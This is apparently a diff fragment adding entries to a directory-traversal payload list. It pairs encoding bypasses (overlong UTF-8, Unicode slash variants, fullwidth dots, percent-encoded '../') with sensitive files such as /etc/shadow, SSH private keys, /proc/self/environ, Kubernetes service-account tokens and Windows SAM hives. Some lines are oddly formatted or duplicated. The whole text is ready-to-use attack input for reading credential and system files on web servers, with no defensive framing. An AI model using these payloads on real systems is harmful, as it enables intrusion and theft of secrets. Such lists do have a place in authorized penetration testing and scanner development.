+\ = %c0%5c, %c0%80%5c/sysprep/sysprep.xml
+\ = %c0%5c, %c0%80%5c/system volume information/wpsettings.dat
+\ = %c0%5c, %c0%80%5c/system32/inetsrv/metabase.xml
+\ = %c0%5c, %c0%80%5c/unattend.txt
+\ = %c0%5c, %c0%80%5c/unattend.xml
+\ = %c0%5c, %c0%80%5c/unattended.txt
+\ = %c0%5c, %c0%80%5c/unattended.xml
+\ = %c0%5c, %c0%80%5c/windows/repair/sam
+\ = %c0%5c, %c0%80%5c/windows/repair/system
+\ = %c0%5c, %c0%80%5c/var/log/apache/access.log
+\ = %c0%5c, %c0%80%5c/var/log/apache/error.log
+\ = %c0%5c, %c0%80%5c/var/log/httpd/error_log
+\ = %c0%5c, %c0%80%5c/usr/local/apache/log/error_log
+\ = %c0%5c, %c0%80%5c/usr/local/apache2/log/error_log
+\ = %c0%5c, %c0%80%5c/var/log/nginx/access.log
+\ = %c0%5c, %c0%80%5c/var/log/nginx/error.log
+\ = %c0%5c, %c0%80%5c/var/log/vsftpd.log
+\ = %c0%5c, %c0%80%5c/var/log/sshd.log
+\ = %c0%5c, %c0%80%5c/var/log/mail
+/ = %c0%af, %e0%80%af, %c0%2f/etc/issue
+/ = %c0%af, %e0%80%af, %c0%2f/etc/passwd
+/ = %c0%af, %e0%80%af, %c0%2f/etc/shadow
+/ = %c0%af, %e0%80%af, %c0%2f/etc/group
+/ = %c0%af, %e0%80%af, %c0%2f/etc/hosts
+/ = %c0%af, %e0%80%af, %c0%2f/etc/motd
+/ = %c0%af, %e0%80%af, %c0%2f/etc/mysql/my.cnf
+/ = %c0%af, %e0%80%af, %c0%2f/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/ = %c0%af, %e0%80%af, %c0%2f/proc/self/environ
+/ = %c0%af, %e0%80%af, %c0%2f/proc/version
+/ = %c0%af, %e0%80%af, %c0%2f/proc/cmdline
+/ = %c0%af, %e0%80%af, %c0%2f/proc/sched_debug
+/ = %c0%af, %e0%80%af, %c0%2f/proc/mounts
+/ = %c0%af, %e0%80%af, %c0%2f/proc/net/arp
+/ = %c0%af, %e0%80%af, %c0%2f/proc/net/route
+/ = %c0%af, %e0%80%af, %c0%2f/proc/net/tcp
+/ = %c0%af, %e0%80%af, %c0%2f/proc/net/udp
+/ = %c0%af, %e0%80%af, %c0%2f/proc/self/cwd/index.php
+/ = %c0%af, %e0%80%af, %c0%2f/proc/self/cwd/main.py
+/ = %c0%af, %e0%80%af, %c0%2f/home/$USER/.bash_history
+/ = %c0%af, %e0%80%af, %c0%2f/home/$USER/.ssh/id_rsa
+/ = %c0%af, %e0%80%af, %c0%2f/run/secrets/kubernetes.io/serviceaccount/token
+/ = %c0%af, %e0%80%af, %c0%2f/run/secrets/kubernetes.io/serviceaccount/namespace
+/ = %c0%af, %e0%80%af, %c0%2f/run/secrets/kubernetes.io/serviceaccount/certificate
+/ = %c0%af, %e0%80%af, %c0%2f/var/run/secrets/kubernetes.io/serviceaccount
+/ = %c0%af, %e0%80%af, %c0%2f/var/lib/mlocate/mlocate.db
+/ = %c0%af, %e0%80%af, %c0%2f/var/lib/mlocate.db
+/ = %c0%af, %e0%80%af, %c0%2f/boot.ini
+/ = %c0%af, %e0%80%af, %c0%2f/inetpub/logs/logfiles
+/ = %c0%af, %e0%80%af, %c0%2f/inetpub/wwwroot/global.asa
+/ = %c0%af, %e0%80%af, %c0%2f/inetpub/wwwroot/index.asp
+/ = %c0%af, %e0%80%af, %c0%2f/inetpub/wwwroot/web.config
+/ = %c0%af, %e0%80%af, %c0%2f/sysprep.inf
+/ = %c0%af, %e0%80%af, %c0%2f/sysprep.xml
+/ = %c0%af, %e0%80%af, %c0%2f/sysprep/sysprep.inf
+/ = %c0%af, %e0%80%af, %c0%2f/sysprep/sysprep.xml
+/ = %c0%af, %e0%80%af, %c0%2f/system32/inetsrv/metabase.xml
+/ = %c0%af, %e0%80%af, %c0%2f/sysprep.inf
+/ = %c0%af, %e0%80%af, %c0%2f/sysprep.xml
+/ = %c0%af, %e0%80%af, %c0%2f/sysprep/sysprep.inf
+/ = %c0%af, %e0%80%af, %c0%2f/sysprep/sysprep.xml
+/ = %c0%af, %e0%80%af, %c0%2f/system volume information/wpsettings.dat
+/ = %c0%af, %e0%80%af, %c0%2f/system32/inetsrv/metabase.xml
+/ = %c0%af, %e0%80%af, %c0%2f/unattend.txt
+/ = %c0%af, %e0%80%af, %c0%2f/unattend.xml
+/ = %c0%af, %e0%80%af, %c0%2f/unattended.txt
+/ = %c0%af, %e0%80%af, %c0%2f/unattended.xml
+/ = %c0%af, %e0%80%af, %c0%2f/windows/repair/sam
+/ = %c0%af, %e0%80%af, %c0%2f/windows/repair/system
+/ = %c0%af, %e0%80%af, %c0%2f/var/log/apache/access.log
+/ = %c0%af, %e0%80%af, %c0%2f/var/log/apache/error.log
+/ = %c0%af, %e0%80%af, %c0%2f/var/log/httpd/error_log
+/ = %c0%af, %e0%80%af, %c0%2f/usr/local/apache/log/error_log
+/ = %c0%af, %e0%80%af, %c0%2f/usr/local/apache2/log/error_log
+/ = %c0%af, %e0%80%af, %c0%2f/var/log/nginx/access.log
+/ = %c0%af, %e0%80%af, %c0%2f/var/log/nginx/error.log
+/ = %c0%af, %e0%80%af, %c0%2f/var/log/vsftpd.log
+/ = %c0%af, %e0%80%af, %c0%2f/var/log/sshd.log
+/ = %c0%af, %e0%80%af, %c0%2f/var/log/mail
+. = %c0%2e, %e0%40%ae, %c0ae/etc/issue
+. = %c0%2e, %e0%40%ae, %c0ae/etc/passwd
+. = %c0%2e, %e0%40%ae, %c0ae/etc/shadow
+. = %c0%2e, %e0%40%ae, %c0ae/etc/group
+. = %c0%2e, %e0%40%ae, %c0ae/etc/hosts
+. = %c0%2e, %e0%40%ae, %c0ae/etc/motd
+. = %c0%2e, %e0%40%ae, %c0ae/etc/mysql/my.cnf
+. = %c0%2e, %e0%40%ae, %c0ae/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+. = %c0%2e, %e0%40%ae, %c0ae/proc/self/environ
+. = %c0%2e, %e0%40%ae, %c0ae/proc/version
+. = %c0%2e, %e0%40%ae, %c0ae/proc/cmdline
+. = %c0%2e, %e0%40%ae, %c0ae/proc/sched_debug
+. = %c0%2e, %e0%40%ae, %c0ae/proc/mounts
+. = %c0%2e, %e0%40%ae, %c0ae/proc/net/arp
+. = %c0%2e, %e0%40%ae, %c0ae/proc/net/route
+. = %c0%2e, %e0%40%ae, %c0ae/proc/net/tcp
+. = %c0%2e, %e0%40%ae, %c0ae/proc/net/udp
+. = %c0%2e, %e0%40%ae, %c0ae/proc/self/cwd/index.php
+. = %c0%2e, %e0%40%ae, %c0ae/proc/self/cwd/main.py
+. = %c0%2e, %e0%40%ae, %c0ae/home/$USER/.bash_history
+. = %c0%2e, %e0%40%ae, %c0ae/home/$USER/.ssh/id_rsa
+. = %c0%2e, %e0%40%ae, %c0ae/run/secrets/kubernetes.io/serviceaccount/token
+. = %c0%2e, %e0%40%ae, %c0ae/run/secrets/kubernetes.io/serviceaccount/namespace
+. = %c0%2e, %e0%40%ae, %c0ae/run/secrets/kubernetes.io/serviceaccount/certificate
+. = %c0%2e, %e0%40%ae, %c0ae/var/run/secrets/kubernetes.io/serviceaccount
+. = %c0%2e, %e0%40%ae, %c0ae/var/lib/mlocate/mlocate.db
+. = %c0%2e, %e0%40%ae, %c0ae/var/lib/mlocate.db
+. = %c0%2e, %e0%40%ae, %c0ae/boot.ini
+. = %c0%2e, %e0%40%ae, %c0ae/inetpub/logs/logfiles
+. = %c0%2e, %e0%40%ae, %c0ae/inetpub/wwwroot/global.asa
+. = %c0%2e, %e0%40%ae, %c0ae/inetpub/wwwroot/index.asp
+. = %c0%2e, %e0%40%ae, %c0ae/inetpub/wwwroot/web.config
+. = %c0%2e, %e0%40%ae, %c0ae/sysprep.inf
+. = %c0%2e, %e0%40%ae, %c0ae/sysprep.xml
+. = %c0%2e, %e0%40%ae, %c0ae/sysprep/sysprep.inf
+. = %c0%2e, %e0%40%ae, %c0ae/sysprep/sysprep.xml
+. = %c0%2e, %e0%40%ae, %c0ae/system32/inetsrv/metabase.xml
+. = %c0%2e, %e0%40%ae, %c0ae/sysprep.inf
+. = %c0%2e, %e0%40%ae, %c0ae/sysprep.xml
+. = %c0%2e, %e0%40%ae, %c0ae/sysprep/sysprep.inf
+. = %c0%2e, %e0%40%ae, %c0ae/sysprep/sysprep.xml
+. = %c0%2e, %e0%40%ae, %c0ae/system volume information/wpsettings.dat
+. = %c0%2e, %e0%40%ae, %c0ae/system32/inetsrv/metabase.xml
+. = %c0%2e, %e0%40%ae, %c0ae/unattend.txt
+. = %c0%2e, %e0%40%ae, %c0ae/unattend.xml
+. = %c0%2e, %e0%40%ae, %c0ae/unattended.txt
+. = %c0%2e, %e0%40%ae, %c0ae/unattended.xml
+. = %c0%2e, %e0%40%ae, %c0ae/windows/repair/sam
+. = %c0%2e, %e0%40%ae, %c0ae/windows/repair/system
+. = %c0%2e, %e0%40%ae, %c0ae/var/log/apache/access.log
+. = %c0%2e, %e0%40%ae, %c0ae/var/log/apache/error.log
+. = %c0%2e, %e0%40%ae, %c0ae/var/log/httpd/error_log
+. = %c0%2e, %e0%40%ae, %c0ae/usr/local/apache/log/error_log
+. = %c0%2e, %e0%40%ae, %c0ae/usr/local/apache2/log/error_log
+. = %c0%2e, %e0%40%ae, %c0ae/var/log/nginx/access.log
+. = %c0%2e, %e0%40%ae, %c0ae/var/log/nginx/error.log
+. = %c0%2e, %e0%40%ae, %c0ae/var/log/vsftpd.log
+. = %c0%2e, %e0%40%ae, %c0ae/var/log/sshd.log
+. = %c0%2e, %e0%40%ae, %c0ae/var/log/mail
+\ = %u2216etc/issue
+\ = %u2216etc/passwd
+\ = %u2216etc/shadow
+\ = %u2216etc/group
+\ = %u2216etc/hosts
+\ = %u2216etc/motd
+\ = %u2216etc/mysql/my.cnf
+\ = %u2216proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+\ = %u2216proc/self/environ
+\ = %u2216proc/version
+\ = %u2216proc/cmdline
+\ = %u2216proc/sched_debug
+\ = %u2216proc/mounts
+\ = %u2216proc/net/arp
+\ = %u2216proc/net/route
+\ = %u2216proc/net/tcp
+\ = %u2216proc/net/udp
+\ = %u2216proc/self/cwd/index.php
+\ = %u2216proc/self/cwd/main.py
+\ = %u2216home/$USER/.bash_history
+\ = %u2216home/$USER/.ssh/id_rsa
+\ = %u2216run/secrets/kubernetes.io/serviceaccount/token
+\ = %u2216run/secrets/kubernetes.io/serviceaccount/namespace
+\ = %u2216run/secrets/kubernetes.io/serviceaccount/certificate
+\ = %u2216var/run/secrets/kubernetes.io/serviceaccount
+\ = %u2216var/lib/mlocate/mlocate.db
+\ = %u2216var/lib/mlocate.db
+\ = %u2216boot.ini
+\ = %u2216inetpub/logs/logfiles
+\ = %u2216inetpub/wwwroot/global.asa
+\ = %u2216inetpub/wwwroot/index.asp
+\ = %u2216inetpub/wwwroot/web.config
+\ = %u2216sysprep.inf
+\ = %u2216sysprep.xml
+\ = %u2216sysprep/sysprep.inf
+\ = %u2216sysprep/sysprep.xml
+\ = %u2216system32/inetsrv/metabase.xml
+\ = %u2216sysprep.inf
+\ = %u2216sysprep.xml
+\ = %u2216sysprep/sysprep.inf
+\ = %u2216sysprep/sysprep.xml
+\ = %u2216system volume information/wpsettings.dat
+\ = %u2216system32/inetsrv/metabase.xml
+\ = %u2216unattend.txt
+\ = %u2216unattend.xml
+\ = %u2216unattended.txt
+\ = %u2216unattended.xml
+\ = %u2216windows/repair/sam
+\ = %u2216windows/repair/system
+\ = %u2216var/log/apache/access.log
+\ = %u2216var/log/apache/error.log
+\ = %u2216var/log/httpd/error_log
+\ = %u2216usr/local/apache/log/error_log
+\ = %u2216usr/local/apache2/log/error_log
+\ = %u2216var/log/nginx/access.log
+\ = %u2216var/log/nginx/error.log
+\ = %u2216var/log/vsftpd.log
+\ = %u2216var/log/sshd.log
+\ = %u2216var/log/mail
+/ = %u2215etc/issue
+/ = %u2215etc/passwd
+/ = %u2215etc/shadow
+/ = %u2215etc/group
+/ = %u2215etc/hosts
+/ = %u2215etc/motd
+/ = %u2215etc/mysql/my.cnf
+/ = %u2215proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/ = %u2215proc/self/environ
+/ = %u2215proc/version
+/ = %u2215proc/cmdline
+/ = %u2215proc/sched_debug
+/ = %u2215proc/mounts
+/ = %u2215proc/net/arp
+/ = %u2215proc/net/route
+/ = %u2215proc/net/tcp
+/ = %u2215proc/net/udp
+/ = %u2215proc/self/cwd/index.php
+/ = %u2215proc/self/cwd/main.py
+/ = %u2215home/$USER/.bash_history
+/ = %u2215home/$USER/.ssh/id_rsa
+/ = %u2215run/secrets/kubernetes.io/serviceaccount/token
+/ = %u2215run/secrets/kubernetes.io/serviceaccount/namespace
+/ = %u2215run/secrets/kubernetes.io/serviceaccount/certificate
+/ = %u2215var/run/secrets/kubernetes.io/serviceaccount
+/ = %u2215var/lib/mlocate/mlocate.db
+/ = %u2215var/lib/mlocate.db
+/ = %u2215boot.ini
+/ = %u2215inetpub/logs/logfiles
+/ = %u2215inetpub/wwwroot/global.asa
+/ = %u2215inetpub/wwwroot/index.asp
+/ = %u2215inetpub/wwwroot/web.config
+/ = %u2215sysprep.inf
+/ = %u2215sysprep.xml
+/ = %u2215sysprep/sysprep.inf
+/ = %u2215sysprep/sysprep.xml
+/ = %u2215system32/inetsrv/metabase.xml
+/ = %u2215sysprep.inf
+/ = %u2215sysprep.xml
+/ = %u2215sysprep/sysprep.inf
+/ = %u2215sysprep/sysprep.xml
+/ = %u2215system volume information/wpsettings.dat
+/ = %u2215system32/inetsrv/metabase.xml
+/ = %u2215unattend.txt
+/ = %u2215unattend.xml
+/ = %u2215unattended.txt
+/ = %u2215unattended.xml
+/ = %u2215windows/repair/sam
+/ = %u2215windows/repair/system
+/ = %u2215var/log/apache/access.log
+/ = %u2215var/log/apache/error.log
+/ = %u2215var/log/httpd/error_log
+/ = %u2215usr/local/apache/log/error_log
+/ = %u2215usr/local/apache2/log/error_log
+/ = %u2215var/log/nginx/access.log
+/ = %u2215var/log/nginx/error.log
+/ = %u2215var/log/vsftpd.log
+/ = %u2215var/log/sshd.log
+/ = %u2215var/log/mail
+. = %u002eetc/issue
+. = %u002eetc/passwd
+. = %u002eetc/shadow
+. = %u002eetc/group
+. = %u002eetc/hosts
+. = %u002eetc/motd
+. = %u002eetc/mysql/my.cnf
+. = %u002eproc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+. = %u002eproc/self/environ
+. = %u002eproc/version
+. = %u002eproc/cmdline
+. = %u002eproc/sched_debug
+. = %u002eproc/mounts
+. = %u002eproc/net/arp
+. = %u002eproc/net/route
+. = %u002eproc/net/tcp
+. = %u002eproc/net/udp
+. = %u002eproc/self/cwd/index.php
+. = %u002eproc/self/cwd/main.py
+. = %u002ehome/$USER/.bash_history
+. = %u002ehome/$USER/.ssh/id_rsa
+. = %u002erun/secrets/kubernetes.io/serviceaccount/token
+. = %u002erun/secrets/kubernetes.io/serviceaccount/namespace
+. = %u002erun/secrets/kubernetes.io/serviceaccount/certificate
+. = %u002evar/run/secrets/kubernetes.io/serviceaccount
+. = %u002evar/lib/mlocate/mlocate.db
+. = %u002evar/lib/mlocate.db
+. = %u002eboot.ini
+. = %u002einetpub/logs/logfiles
+. = %u002einetpub/wwwroot/global.asa
+. = %u002einetpub/wwwroot/index.asp
+. = %u002einetpub/wwwroot/web.config
+. = %u002esysprep.inf
+. = %u002esysprep.xml
+. = %u002esysprep/sysprep.inf
+. = %u002esysprep/sysprep.xml
+. = %u002esystem32/inetsrv/metabase.xml
+. = %u002esysprep.inf
+. = %u002esysprep.xml
+. = %u002esysprep/sysprep.inf
+. = %u002esysprep/sysprep.xml
+. = %u002esystem volume information/wpsettings.dat
+. = %u002esystem32/inetsrv/metabase.xml
+. = %u002eunattend.txt
+. = %u002eunattend.xml
+. = %u002eunattended.txt
+. = %u002eunattended.xml
+. = %u002ewindows/repair/sam
+. = %u002ewindows/repair/system
+. = %u002evar/log/apache/access.log
+. = %u002evar/log/apache/error.log
+. = %u002evar/log/httpd/error_log
+. = %u002eusr/local/apache/log/error_log
+. = %u002eusr/local/apache2/log/error_log
+. = %u002evar/log/nginx/access.log
+. = %u002evar/log/nginx/error.log
+. = %u002evar/log/vsftpd.log
+. = %u002evar/log/sshd.log
+. = %u002evar/log/mail
+/%uff0e%uff0e%u2216/etc/issue
+/%uff0e%uff0e%u2216/etc/passwd
+/%uff0e%uff0e%u2216/etc/shadow
+/%uff0e%uff0e%u2216/etc/group
+/%uff0e%uff0e%u2216/etc/hosts
+/%uff0e%uff0e%u2216/etc/motd
+/%uff0e%uff0e%u2216/etc/mysql/my.cnf
+/%uff0e%uff0e%u2216/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/%uff0e%uff0e%u2216/proc/self/environ
+/%uff0e%uff0e%u2216/proc/version
+/%uff0e%uff0e%u2216/proc/cmdline
+/%uff0e%uff0e%u2216/proc/sched_debug
+/%uff0e%uff0e%u2216/proc/mounts
+/%uff0e%uff0e%u2216/proc/net/arp
+/%uff0e%uff0e%u2216/proc/net/route
+/%uff0e%uff0e%u2216/proc/net/tcp
+/%uff0e%uff0e%u2216/proc/net/udp
+/%uff0e%uff0e%u2216/proc/self/cwd/index.php
+/%uff0e%uff0e%u2216/proc/self/cwd/main.py
+/%uff0e%uff0e%u2216/home/$USER/.bash_history
+/%uff0e%uff0e%u2216/home/$USER/.ssh/id_rsa
+/%uff0e%uff0e%u2216/run/secrets/kubernetes.io/serviceaccount/token
+/%uff0e%uff0e%u2216/run/secrets/kubernetes.io/serviceaccount/namespace
+/%uff0e%uff0e%u2216/run/secrets/kubernetes.io/serviceaccount/certificate
+/%uff0e%uff0e%u2216/var/run/secrets/kubernetes.io/serviceaccount
+/%uff0e%uff0e%u2216/var/lib/mlocate/mlocate.db
+/%uff0e%uff0e%u2216/var/lib/mlocate.db
+/%uff0e%uff0e%u2216/boot.ini
+/%uff0e%uff0e%u2216/inetpub/logs/logfiles
+/%uff0e%uff0e%u2216/inetpub/wwwroot/global.asa
+/%uff0e%uff0e%u2216/inetpub/wwwroot/index.asp
+/%uff0e%uff0e%u2216/inetpub/wwwroot/web.config
+/%uff0e%uff0e%u2216/sysprep.inf
+/%uff0e%uff0e%u2216/sysprep.xml
+/%uff0e%uff0e%u2216/sysprep/sysprep.inf
+/%uff0e%uff0e%u2216/sysprep/sysprep.xml
+/%uff0e%uff0e%u2216/system32/inetsrv/metabase.xml
+/%uff0e%uff0e%u2216/sysprep.inf
+/%uff0e%uff0e%u2216/sysprep.xml
+/%uff0e%uff0e%u2216/sysprep/sysprep.inf
+/%uff0e%uff0e%u2216/sysprep/sysprep.xml
+/%uff0e%uff0e%u2216/system volume information/wpsettings.dat
+/%uff0e%uff0e%u2216/system32/inetsrv/metabase.xml
+/%uff0e%uff0e%u2216/unattend.txt
+/%uff0e%uff0e%u2216/unattend.xml
+/%uff0e%uff0e%u2216/unattended.txt
+/%uff0e%uff0e%u2216/unattended.xml
+/%uff0e%uff0e%u2216/windows/repair/sam
+/%uff0e%uff0e%u2216/windows/repair/system
+/%uff0e%uff0e%u2216/var/log/apache/access.log
+/%uff0e%uff0e%u2216/var/log/apache/error.log
+/%uff0e%uff0e%u2216/var/log/httpd/error_log
+/%uff0e%uff0e%u2216/usr/local/apache/log/error_log
+/%uff0e%uff0e%u2216/usr/local/apache2/log/error_log
+/%uff0e%uff0e%u2216/var/log/nginx/access.log
+/%uff0e%uff0e%u2216/var/log/nginx/error.log
+/%uff0e%uff0e%u2216/var/log/vsftpd.log
+/%uff0e%uff0e%u2216/var/log/sshd.log
+/%uff0e%uff0e%u2216/var/log/mail
+/%uff0e%uff0e%u2215/etc/issue
+/%uff0e%uff0e%u2215/etc/passwd
+/%uff0e%uff0e%u2215/etc/shadow
+/%uff0e%uff0e%u2215/etc/group
+/%uff0e%uff0e%u2215/etc/hosts
+/%uff0e%uff0e%u2215/etc/motd
+/%uff0e%uff0e%u2215/etc/mysql/my.cnf
+/%uff0e%uff0e%u2215/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/%uff0e%uff0e%u2215/proc/self/environ
+/%uff0e%uff0e%u2215/proc/version
+/%uff0e%uff0e%u2215/proc/cmdline
+/%uff0e%uff0e%u2215/proc/sched_debug
+/%uff0e%uff0e%u2215/proc/mounts
+/%uff0e%uff0e%u2215/proc/net/arp
+/%uff0e%uff0e%u2215/proc/net/route
+/%uff0e%uff0e%u2215/proc/net/tcp
+/%uff0e%uff0e%u2215/proc/net/udp
+/%uff0e%uff0e%u2215/proc/self/cwd/index.php
+/%uff0e%uff0e%u2215/proc/self/cwd/main.py
+/%uff0e%uff0e%u2215/home/$USER/.bash_history
+/%uff0e%uff0e%u2215/home/$USER/.ssh/id_rsa
+/%uff0e%uff0e%u2215/run/secrets/kubernetes.io/serviceaccount/token
+/%uff0e%uff0e%u2215/run/secrets/kubernetes.io/serviceaccount/namespace
+/%uff0e%uff0e%u2215/run/secrets/kubernetes.io/serviceaccount/certificate
+/%uff0e%uff0e%u2215/var/run/secrets/kubernetes.io/serviceaccount
+/%uff0e%uff0e%u2215/var/lib/mlocate/mlocate.db
+/%uff0e%uff0e%u2215/var/lib/mlocate.db
+/%uff0e%uff0e%u2215/boot.ini
+/%uff0e%uff0e%u2215/inetpub/logs/logfiles
+/%uff0e%uff0e%u2215/inetpub/wwwroot/global.asa
+/%uff0e%uff0e%u2215/inetpub/wwwroot/index.asp
+/%uff0e%uff0e%u2215/inetpub/wwwroot/web.config
+/%uff0e%uff0e%u2215/sysprep.inf
+/%uff0e%uff0e%u2215/sysprep.xml
+/%uff0e%uff0e%u2215/sysprep/sysprep.inf
+/%uff0e%uff0e%u2215/sysprep/sysprep.xml
+/%uff0e%uff0e%u2215/system32/inetsrv/metabase.xml
+/%uff0e%uff0e%u2215/sysprep.inf
+/%uff0e%uff0e%u2215/sysprep.xml
+/%uff0e%uff0e%u2215/sysprep/sysprep.inf
+/%uff0e%uff0e%u2215/sysprep/sysprep.xml
+/%uff0e%uff0e%u2215/system volume information/wpsettings.dat
+/%uff0e%uff0e%u2215/system32/inetsrv/metabase.xml
+/%uff0e%uff0e%u2215/unattend.txt
+/%uff0e%uff0e%u2215/unattend.xml
+/%uff0e%uff0e%u2215/unattended.txt
+/%uff0e%uff0e%u2215/unattended.xml
+/%uff0e%uff0e%u2215/windows/repair/sam
+/%uff0e%uff0e%u2215/windows/repair/system
+/%uff0e%uff0e%u2215/var/log/apache/access.log
+/%uff0e%uff0e%u2215/var/log/apache/error.log
+/%uff0e%uff0e%u2215/var/log/httpd/error_log
+/%uff0e%uff0e%u2215/usr/local/apache/log/error_log
+/%uff0e%uff0e%u2215/usr/local/apache2/log/error_log
+/%uff0e%uff0e%u2215/var/log/nginx/access.log
+/%uff0e%uff0e%u2215/var/log/nginx/error.log
+/%uff0e%uff0e%u2215/var/log/vsftpd.log
+/%uff0e%uff0e%u2215/var/log/sshd.log
+/%uff0e%uff0e%u2215/var/log/mail
+/%c0%ae%c0%ae%c0%af/etc/issue
+/%c0%ae%c0%ae%c0%af/etc/passwd
+/%c0%ae%c0%ae%c0%af/etc/shadow
+/%c0%ae%c0%ae%c0%af/etc/group
+/%c0%ae%c0%ae%c0%af/etc/hosts
+/%c0%ae%c0%ae%c0%af/etc/motd
+/%c0%ae%c0%ae%c0%af/etc/mysql/my.cnf
+/%c0%ae%c0%ae%c0%af/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/%c0%ae%c0%ae%c0%af/proc/self/environ
+/%c0%ae%c0%ae%c0%af/proc/version
+/%c0%ae%c0%ae%c0%af/proc/cmdline
+/%c0%ae%c0%ae%c0%af/proc/sched_debug
+/%c0%ae%c0%ae%c0%af/proc/mounts
+/%c0%ae%c0%ae%c0%af/proc/net/arp
+/%c0%ae%c0%ae%c0%af/proc/net/route
+/%c0%ae%c0%ae%c0%af/proc/net/tcp
+/%c0%ae%c0%ae%c0%af/proc/net/udp
+/%c0%ae%c0%ae%c0%af/proc/self/cwd/index.php
+/%c0%ae%c0%ae%c0%af/proc/self/cwd/main.py
+/%c0%ae%c0%ae%c0%af/home/$USER/.bash_history
+/%c0%ae%c0%ae%c0%af/home/$USER/.ssh/id_rsa
+/%c0%ae%c0%ae%c0%af/run/secrets/kubernetes.io/serviceaccount/token
+/%c0%ae%c0%ae%c0%af/run/secrets/kubernetes.io/serviceaccount/namespace
+/%c0%ae%c0%ae%c0%af/run/secrets/kubernetes.io/serviceaccount/certificate
+/%c0%ae%c0%ae%c0%af/var/run/secrets/kubernetes.io/serviceaccount
+/%c0%ae%c0%ae%c0%af/var/lib/mlocate/mlocate.db
+/%c0%ae%c0%ae%c0%af/var/lib/mlocate.db
+/%c0%ae%c0%ae%c0%af/boot.ini
+/%c0%ae%c0%ae%c0%af/inetpub/logs/logfiles
+/%c0%ae%c0%ae%c0%af/inetpub/wwwroot/global.asa
+/%c0%ae%c0%ae%c0%af/inetpub/wwwroot/index.asp
+/%c0%ae%c0%ae%c0%af/inetpub/wwwroot/web.config
+/%c0%ae%c0%ae%c0%af/sysprep.inf
+/%c0%ae%c0%ae%c0%af/sysprep.xml
+/%c0%ae%c0%ae%c0%af/sysprep/sysprep.inf
+/%c0%ae%c0%ae%c0%af/sysprep/sysprep.xml
+/%c0%ae%c0%ae%c0%af/system32/inetsrv/metabase.xml
+/%c0%ae%c0%ae%c0%af/sysprep.inf
+/%c0%ae%c0%ae%c0%af/sysprep.xml
+/%c0%ae%c0%ae%c0%af/sysprep/sysprep.inf
+/%c0%ae%c0%ae%c0%af/sysprep/sysprep.xml
+/%c0%ae%c0%ae%c0%af/system volume information/wpsettings.dat
+/%c0%ae%c0%ae%c0%af/system32/inetsrv/metabase.xml
+/%c0%ae%c0%ae%c0%af/unattend.txt
+/%c0%ae%c0%ae%c0%af/unattend.xml
+/%c0%ae%c0%ae%c0%af/unattended.txt
+/%c0%ae%c0%ae%c0%af/unattended.xml
+/%c0%ae%c0%ae%c0%af/windows/repair/sam
+/%c0%ae%c0%ae%c0%af/windows/repair/system
+/%c0%ae%c0%ae%c0%af/var/log/apache/access.log
+/%c0%ae%c0%ae%c0%af/var/log/apache/error.log
+/%c0%ae%c0%ae%c0%af/var/log/httpd/error_log
+/%c0%ae%c0%ae%c0%af/usr/local/apache/log/error_log
+/%c0%ae%c0%ae%c0%af/usr/local/apache2/log/error_log
+/%c0%ae%c0%ae%c0%af/var/log/nginx/access.log
+/%c0%ae%c0%ae%c0%af/var/log/nginx/error.log
+/%c0%ae%c0%ae%c0%af/var/log/vsftpd.log
+/%c0%ae%c0%ae%c0%af/var/log/sshd.log
+/%c0%ae%c0%ae%c0%af/var/log/mail
+/%2e%2e%2f/etc/issue
+/%2e%2e%2f/etc/passwd
+/%2e%2e%2f/etc/shadow
+/%2e%2e%2f/etc/group
+/%2e%2e%2f/etc/hosts
+/%2e%2e%2f/etc/motd
+/%2e%2e%2f/etc/mysql/my.cnf
+/%2e%2e%2f/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/%2e%2e%2f/proc/self/environ
+/%2e%2e%2f/proc/version
+/%2e%2e%2f/proc/cmdline
+/%2e%2e%2f/proc/sched_debug
+/%2e%2e%2f/proc/mounts
+/%2e%2e%2f/proc/net/arp
+/%2e%2e%2f/proc/net/route
+/%2e%2e%2f/proc/net/tcp
+/%2e%2e%2f/proc/net/udp
+/%2e%2e%2f/proc/self/cwd/index.php
+/%2e%2e%2f/proc/self/cwd/main.py
+/%2e%2e%2f/home/$USER/.bash_history
+/%2e%2e%2f/home/$USER/.ssh/id_rsa
+/%2e%2e%2f/run/secrets/kubernetes.io/serviceaccount/token
+/%2e%2e%2f/run/secrets/kubernetes.io/serviceaccount/namespace
+/%2e%2e%2f/run/secrets/kubernetes.io/serviceaccount/certificate
+/%2e%2e%2f/var/run/secrets/kubernetes.io/serviceaccount
+/%2e%2e%2f/var/lib/mlocate/mlocate.db
+/%2e%2e%2f/var/lib/mlocate.db
+/%2e%2e%2f/boot.ini
+/%2e%2e%2f/inetpub/logs/logfiles
+/%2e%2e%2f/inetpub/wwwroot/global.asa
+/%2e%2e%2f/inetpub/wwwroot/index.asp
+/%2e%2e%2f/inetpub/wwwroot/web.config
+/%2e%2e%2f/sysprep.inf
+/%2e%2e%2f/sysprep.xml
+/%2e%2e%2f/sysprep/sysprep.inf
+/%2e%2e%2f/sysprep/sysprep.xml
+/%2e%2e%2f/system32/inetsrv/metabase.xml
+/%2e%2e%2f/sysprep.inf
+/%2e%2e%2f/sysprep.xml
+/%2e%2e%2f/sysprep/sysprep.inf
+/%2e%2e%2f/sysprep/sysprep.xml
+/%2e%2e%2f/system volume information/wpsettings.dat
+/%2e%2e%2f/system32/inetsrv/metabase.xml
+/%2e%2e%2f/unattend.txt
+/%2e%2e%2f/unattend.xml
+/%2e%2e%2f/unattended.txt
+/%2e%2e%2f/unattended.xml
+/%2e%2e%2f/windows/repair/sam
+/%2e%2e%2f/windows/repair/system
+/%2e%2e%2f/var/log/apache/access.log
+/%2e%2e%2f/var/log/apache/error.log
+/%2e%2e%2f/var/log/httpd/error_log
+/%2e%2e%2f/usr/local/apache/log/error_log
+/%2e%2e%2f/usr/local/apache2/log/error_log
+/%2e%2e%2f/var/log/nginx/access.log
+/%2e%2e%2f/var/log/nginx/error.log
